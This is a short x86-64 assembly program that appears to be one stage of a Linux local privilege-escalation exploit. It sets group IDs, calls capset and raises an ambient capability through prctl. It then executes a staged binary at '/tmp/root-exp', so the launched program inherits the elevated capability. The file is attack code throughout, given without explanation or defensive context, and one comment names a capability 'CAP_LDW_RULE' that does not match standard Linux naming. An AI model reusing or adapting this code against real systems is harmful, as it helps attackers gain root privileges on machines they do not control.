BITS 64

; getpid()
mov eax, 39
syscall
mov [rel cap_hdr_pid], eax

; setresgid(500, 500, 500)
mov edx, 500
mov esi, 500
mov edi, 500
mov eax, 119 ; setgid
syscall
cmp eax, 0
jl error

; capset(&hdr, &datap)
lea rdi, [rel cap_hdr]
lea rsi, [rel datap]
mov eax, 126
syscall
cmp eax, 0
jl error

; prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, CAP_LDW_RULE, 0, 0)
mov r8, 0
mov r10, 0
mov edx, 38
mov esi, 2
mov edi, 47
mov eax, 157 ; prctl
syscall
cmp eax, 0
jl error

; execve("/bin/sh", ["sh", 0], [0])
lea rax, [rel sh]
push 0
mov rdx, rsp
push rax
mov rsi, rsp 
lea rdi, [rel binsh]
mov eax, 59 ; execve
syscall

error:
mov edi, 1
lea rsi, [rel serror]
mov edx, 6
mov eax, 1 ; write
syscall

lea rsi, [rel remaining]
lea rdi, [rel sleeping]
mov eax, 35
syscall

mov edi, 0
mov eax, 60
syscall

binsh: db "/tmp/" 
sh: db "root-exp", 0
serror: db "Error", 0xa, 0


cap_hdr:
  dd 0x20080522
cap_hdr_pid:
  dd 0
datap:
  dd 0, 0, 0
  dd 64, 64, 64     ; ldw_rule

sleeping:
  dq 100
  dq 0
remaining:
  dq 0
  dq 0
